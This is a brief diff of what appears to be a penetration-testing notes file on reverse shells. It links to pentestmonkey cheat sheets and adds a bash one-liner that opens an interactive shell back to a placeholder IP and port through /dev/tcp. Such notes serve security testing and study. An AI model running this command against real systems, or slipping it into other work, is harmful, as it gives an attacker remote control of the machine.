@@ -24,6 +24,10 @@ https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 https://github.com/pentestmonkey/php-reverse-shell
 
+### BASH RS
+
+bash -c 'bash -i >& /dev/tcp/<your_ip>/<port> 0>&1'
+
 ### Powershell
 
 ```powershell
